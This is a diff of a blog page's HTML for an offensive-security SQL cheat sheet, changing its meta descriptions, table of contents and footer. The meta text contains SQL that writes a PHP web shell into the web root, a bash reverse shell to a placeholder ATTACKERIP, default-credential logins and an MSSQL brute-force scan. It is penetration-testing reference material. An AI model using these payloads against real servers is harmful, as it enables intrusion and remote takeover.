@@ -5,7 +5,11 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <title>SQL - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="SQL" />
-<meta property="og:description" content="General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root" />
+<meta property="og:description" content="General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root
+Default Password: (none)
+Create a new table, then go to the SQL tab
+SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;C:\\xampp\\htdocs\\command.php&#34;;`http://TARGTEIP/phpmyadmin/command.php?cmd=ipconfigMSSQL-1433 Default username : sa
+Nmap nmap -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://tranquac.github.io/posts/sql/" /><meta property="og:image" content="https://tranquac.github.io/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-06-08T18:17:00&#43;07:00" />
@@ -15,7 +19,11 @@
 <meta name="twitter:image" content="https://tranquac.github.io/logo.png"/>
 
 <meta name="twitter:title" content="SQL"/>
-<meta name="twitter:description" content="General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root"/>
+<meta name="twitter:description" content="General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root
+Default Password: (none)
+Create a new table, then go to the SQL tab
+SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;C:\\xampp\\htdocs\\command.php&#34;;`http://TARGTEIP/phpmyadmin/command.php?cmd=ipconfigMSSQL-1433 Default username : sa
+Nmap nmap -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users."/>
 <meta name="application-name" content="quactv blog">
 <meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -30,7 +38,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/tranquac.github.io\/posts\/sql\/"
-        },"genre": "posts","keywords": "SQL","wordcount":  1368 ,
+        },"genre": "posts","keywords": "SQL","wordcount":  1346 ,
         "url": "https:\/\/tranquac.github.io\/posts\/sql\/","datePublished": "2021-06-08T18:17:00+07:00","dateModified": "2021-06-08T18:17:00+07:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -73,7 +81,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SQL</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>quactv</a></span>&nbsp;<span class="post-category">included in <a href="/categories/offensive-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Offensive Security</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-06-08">2021-06-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1368 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-06-08">2021-06-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1346 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -110,26 +118,7 @@
     </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><ul>
-<li><a href="#general" rel="">General</a>
-<ul>
-<li><a href="#mysql-3306" rel="">MySQL (3306)</a></li>
-<li><a href="#mssql-1433" rel="">MSSQL (1433)</a></li>
-<li><a href="#oracle-1521" rel="">Oracle (1521)</a></li>
-<li><a href="#postgressql-5432" rel="">PostgresSQL (5432)</a></li>
-</ul>
-</li>
-<li><a href="#sql-injection" rel="">SQL Injection</a>
-<ul>
-<li><a href="#bad-character-detect" rel="">Bad character detect</a></li>
-<li><a href="#authen-bypass" rel="">Authen bypass</a></li>
-<li><a href="#sql-injection-bypass-filter" rel="">Sql injection bypass filter</a></li>
-</ul>
-</li>
-<li><a href="#sqlmap" rel="">SQLMAP</a></li>
-<li><a href="#reference" rel="">Reference</a></li>
-</ul>
-<h1 id="general">General</h1>
+            </div><div class="content" id="content"><h1 id="general">General</h1>
 <h2 id="mysql-3306">MySQL-3306</h2>
 <h4 id="nmap">Nmap</h4>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -Pn -sV -p <span class="m">3306</span> --script mysql* TARGETIP
@@ -736,7 +725,7 @@ sqlmap -r login-chris.request --level <span class="m">5</span> --risk <span clas
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp">Security</span></div>
         </div>
     </footer></div>
